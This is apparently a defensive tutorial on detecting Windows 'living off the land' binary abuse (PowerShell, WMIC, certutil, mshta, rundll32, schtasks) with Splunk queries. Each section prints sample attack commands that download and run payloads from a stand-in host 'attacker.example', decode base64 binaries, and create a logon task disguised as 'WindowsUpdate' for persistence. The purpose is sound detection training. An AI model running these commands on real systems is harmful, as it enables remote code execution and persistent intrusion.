---
description: >-
  Threat actors use Living Off the Land techniques because built-in tools are
  already trusted, widely available, and often allowed by default controls.
---

# 💙 LOLBins Detection Methodology (Windows)

<figure><img src="https://images.unsplash.com/photo-1642176849879-92f85770f212?crop=entropy&#x26;cs=srgb&#x26;fm=jpg&#x26;ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw4fHx3aW5kb3dzfGVufDB8fHx8MTc3MTc2ODU1NXww&#x26;ixlib=rb-4.1.0&#x26;q=85" alt=""><figcaption></figcaption></figure>

_In Windows environments, attackers often avoid dropping custom malware and instead abuse built-in system binaries to carry out malicious activity. This technique is known as Living off the Land, and in the Windows ecosystem, these abused binaries are commonly referred to as LOLBins (Living Off the Land Binaries)._

LOLBins are legitimate, Microsoft-signed executables that are part of the operating system. Tools like `powershell.exe`, `certutil.exe`, `mshta.exe`, and `rundll32.exe` are designed for administrative and operational purposes. However, when misused, they can be leveraged to download payloads, execute remote code, move laterally across systems, and evade traditional security controls.



Commonly abused tools provide scripting, management, file handling, or scheduling capabilities, which match common attacker needs like execution, persistence, reconnaissance, and lateral movement. Examples include 🪳

* <mark style="color:$danger;">**PowerShell**</mark> is used for in-memory scripting, remote downloads, and automation.
* <mark style="color:$danger;">**WMIC**</mark> or <mark style="color:$danger;">**WMI**</mark> is used to run commands locally or on remote hosts and to query system state.
* <mark style="color:$danger;">**Certutil**</mark> is used to fetch files and encode or decode payloads.
* <mark style="color:$danger;">**Mshta**</mark> is used to run HTA content or an inline script delivered by a document or link.
* <mark style="color:$danger;">**Rundll32**</mark> is used to invoke DLL exports or trigger URL handlers.
* <mark style="color:$danger;">**Scheduled tasks**</mark> <mark style="color:$danger;"></mark><mark style="color:$danger;">(</mark><mark style="color:$danger;">**schtasks**</mark><mark style="color:$danger;">)</mark> are used to run code at logon or on a schedule for persistence.



In this section, we will focus on understanding how LOLBins are abused and how to build practical detection logic  utilizing Windows Event IDs and Sysmon logs utilizing Splunk as a SIEM.

Let's Begin!

<h2 align="center"><mark style="color:$primary;">1. PowerShell</mark></h2>

<figure><img src="https://images.unsplash.com/photo-1429552077091-836152271555?crop=entropy&#x26;cs=srgb&#x26;fm=jpg&#x26;ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw1fHxwb3dlcnxlbnwwfHx8fDE3NzE3Njk1MjJ8MA&#x26;ixlib=rb-4.1.0&#x26;q=85" alt="" width="563"><figcaption></figcaption></figure>

_PowerShell is a scripting engine used for administration and automation in Windows systems._

Attackers use PowerShell because it can run scripts directly in memory without creating files, automate many system actions, interact with the network, and bypass some execution policies. Common purposes include downloading payloads, gathering information, running code stealthily, or modifying system settings.

```powershell
PS C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
PS C:\> powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...
PS C:\> powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"
```

* _In the above example, the first command uses the **IEX** (**DownloadString**) pattern to let an attacker fetch a script from a remote server and run it immediately in memory, avoiding disk artefacts and slowing detection._ &#x20;
* _In the second command, **-EncodedCommand** hides the payload in **base64**, so human reviewers and simple log filters may miss the intent. Finally, it downloads and executes the **file.exe.**_

An example detection is shown below:

```splunk
index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
(CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*" OR CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

<h2 align="center"><mark style="color:$success;">2. WMIC</mark></h2>

<figure><img src="https://images.unsplash.com/photo-1512053459797-38c3a066cabd?crop=entropy&#x26;cs=srgb&#x26;fm=jpg&#x26;ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwzfHxpbnN0cnVtZW50fGVufDB8fHx8MTc3MTc2OTU0NXww&#x26;ixlib=rb-4.1.0&#x26;q=85" alt="" width="563"><figcaption></figcaption></figure>

_WMIC (Windows Management Instrumentation Command-line) lets administrators query and manage local or remote Windows systems. It is commonly used by threat actors to execute commands remotely, through starting processes._

Attackers use **WMIC** to execute commands or create processes remotely, collect system information, or establish persistence without using external binaries. It blends with admin behaviour and is often allowed in restricted environments.

```powershell
PS C:\> wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
PS C:\> wmic /node:TARGETHOST process get name,commandline
PS C:\> wmic process call create "notepad.exe" /hidden
```

* _In the first **WMIC** command, the operator targets a remote host and requests that the remote system create a new process. That new process is a PowerShell instance that downloads and executes a remote script, so WMIC acts as a remote launcher._&#x20;
* _In the second WMIC command, the tool queries the remote system for its running processes and command lines, returning structured info useful for reconnaissance across hosts. 💥_
* _In the third **WMIC** command, the local **WMIC** `process call create` API is used to spawn `notepad.exe` On the same machine, the optional hiding flag demonstrates how an attacker might try to make a spawned process less visible._

An example detection alert can be found below:

```spl
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
(CommandLine="*\\wmic.exe*process call create*" OR CommandLine="*wmic /node:* process call create*" OR CommandLine="*wmic*process get Name,CommandLine*")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

<h2 align="center"><mark style="color:$warning;">3. Certutil</mark></h2>

<figure><img src="https://images.unsplash.com/photo-1570610159825-ec5d3823660c?crop=entropy&#x26;cs=srgb&#x26;fm=jpg&#x26;ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw0fHxjZXJ0aWZpY2F0ZXxlbnwwfHx8fDE3NzE3Njk1NjR8MA&#x26;ixlib=rb-4.1.0&#x26;q=85" alt="" width="563"><figcaption></figcaption></figure>

_Certutil is a Microsoft tool used for managing certificates and encoding or decoding data. Certutil is intended for certificate management; it can download files with`-urlcache`, and it can decode **base64** payloads, turning text blobs into binaries. Attackers use it because it is signed by Microsoft and common in admin workflows. It can place files without using curl or similar software, and it bypasses some simple blocking rules._

Threat actors use Certutil to download files, decode **base64-encoded** payloads, or disguise malicious code as legitimate certificate operations. Its network and file-handling capabilities make it a versatile tool for staging payloads or decoding encrypted scripts.

```powershell
PS C:\> certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe
PS C:\> certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe
PS C:\> certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64
```

* _In the first certutil command, the `-urlcache -split -f` flags instruct certutil to fetch the remote URL and write it to the specified local path; the result is a file dropped on disk that can be executed later._
* _In the second command, certutil reads a base64 text file `encoded.b64`, decodes it, and writes the resulting binary to `decoded.exe`, so an attacker can transport a binary as text, then reconstruct it on the host._
* _In the third command, certutil encodes an existing binary into base64 text stored in `payload.b64`. This can be used to obfuscate the payload during staging or transit._

Example alert:

```spl
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663)
(Image="*\\certutil.exe" OR CommandLine="*certutil*")
(CommandLine="* -urlcache * -f *" OR CommandLine="* -decode *" OR CommandLine="* -encode *")
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

<h2 align="center"><mark style="color:purple;">4. MSHTA</mark></h2>

<figure><img src="https://images.unsplash.com/photo-1589820675999-b1fc94f318a3?crop=entropy&#x26;cs=srgb&#x26;fm=jpg&#x26;ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwzfHxzY3JpcHR8ZW58MHx8fHwxNzcxNzY5NTg0fDA&#x26;ixlib=rb-4.1.0&#x26;q=85" alt="" width="188"><figcaption></figcaption></figure>

Mshta runs HTML Application (HTA) files, which can contain VBScript or JavaScript code.

```powershell
PS C:\> mshta "http://attacker.example/payload.hta"
PS C:\> mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command "Start-Process calc.exe"');close();"
PS C:\> mshta "C:\Users\Public\malicious.hta"
```

* _In the first mshta command, mshta loads the HTA from a remote server and executes the HTA content in the host context._
* _In the second mshta command mshta is passed an inline **javascript** URI that creates a **WScript.Shell** ActiveX object and uses it to run **PowerShell**, which then starts a process, this shows how inline script can directly spawn system commands without a saved intermediary._
* _In the third mshta command, mshta runs a local HTA file, useful when the attacker delivers the HTA as an attachment or drops it on a shared drive._

Example alert:

```spl
index=sysmon (EventCode=1 OR EventCode=4688) Image="*\\mshta.exe" (CommandLine="*http*://*" OR CommandLine="*javascript:*" OR CommandLine="*.hta")
| stats count by host, user, ParentImage, CommandLine
```

### Rundll32

Rundll32 executes specific exported functions from DLL files.

LOL via Rundll32

```powershell
PS C:\> rundll32.exe C:\Users\Public\backdoor.dll,Start
PS C:\> rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"
PS C:\> rundll32.exe C:\Windows\Temp\loader.dll,Run
```

* _In the first **rundll32** command, **rundll32** loads the specified **DLL** and calls its exported Start function, which runs the DLL's code._
* _In the second **rundll32** command, **rundll32** invokes url.dll with **FileProtocolHandler** and a remote URL, causing the system handler to process the remote content, which can bootstrap further activity._
* _The third **rundll32** command is called a crafted export in a temporary **DLL**, which may execute embedded loader logic or shellcode from a file placed in a writable location._

Example alert:

```spl
index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7) Image="*\\rundll32.exe" (CommandLine="*\\Users\\Public\\*" OR CommandLine="*url.dll,FileProtocolHandler*" OR CommandLine="*\\Windows\\Temp\\*")
| stats count by host, user, ParentImage, CommandLine
```

<h2 align="center"><mark style="color:green;">5. Scheduled tasks (schtasks / Task Scheduler)</mark></h2>

<figure><img src="https://images.unsplash.com/photo-1484480974693-6ca0a78fb36b?crop=entropy&#x26;cs=srgb&#x26;fm=jpg&#x26;ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwyfHx0YXNrc3xlbnwwfHx8fDE3NzE3Njk2MDh8MA&#x26;ixlib=rb-4.1.0&#x26;q=85" alt="" width="563"><figcaption></figcaption></figure>

_Task Scheduler is a built-in Windows automation because it lets administrators run programs or scripts at specified times, on events such as logon, or on a repeating schedule._&#x20;

> _Tasks have a name, a trigger (when to run), an action (what to run), and an optional run-as account and conditions._&#x20;

_Because it is a standard admin facility, tasks show up in normal system logs and are often allowed by policy, making it a valuable mechanism for both legitimate ops and attacker persistence._\
\
Attackers create or modify tasks to achieve persistence across reboots, to run code at user logon or on a regular cadence, or to quickly re-launch payloads after they remove other artefacts. They often pick task names that look benign, for example, WindowsUpdate or Maintenance, to avoid drawing attention. Tasks can run PowerShell, signed tools, or local scripts.

```powershell
PS C:\> schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""
PS C:\> schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05
PS C:\> schtasks /Run /TN "WindowsUpdate"
```

* _In the first **schtasks** command, a task named `WindowsUpdate` is created to run at logon. The action runs **PowerShell**, which downloads and executes a remote script on each user logon, providing persistence._
* _In the second **schtasks** command a daily task named DailyJob is scheduled to run a local script at **00:0**5 each day, this can automate repeated harmful actions like scheduled encryption or staged data collection._
* _In the third schtasks command, the attacker triggers the named task to run immediately, invoking its configured action on demand._

Example Alert:

```splunk
index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon (EventCode=1 OR EventCode=4688) (CommandLine="*schtasks* /Create*" OR CommandLine="*schtasks* /Run*" OR Image="*\\taskeng.exe" OR EventCode=4698)
| stats count by host, user, EventCode, TaskName, CommandLine
```

***

<p align="center">The above are some examples of Windows software and utilities that can be used as shown, to download, execute files, and encode payloads. But attackers can use a whole variety of software and tools. As analysts, we need to be ready to analyse and update with the latest techniques to catch this activity. </p>

<p align="center">In this section, we explored how attackers abuse Windows LOLBins to execute malicious activity without dropping traditional malware. 🧸</p>

<p align="center"><mark style="color:yellow;"><strong>The Splunk queries provided in this section are meant to serve as starting points. They combine specific Event IDs with behavioral patterns to help you identify suspicious LOLBin activity in your environment. These queries should be tuned according to your organization’s baseline to reduce noise and improve detection accuracy.</strong></mark></p>

<p align="center">Living off the Land attacks are effective because they hide in plain sight. The key to defending against them is visibility, proper logging, and contextual analysis and not just signature-based detection.</p>

<p align="center"><strong>You there? Thankyou so much ❤️</strong></p>

<p align="center">Made with ☕️ by PIkachu. </p>
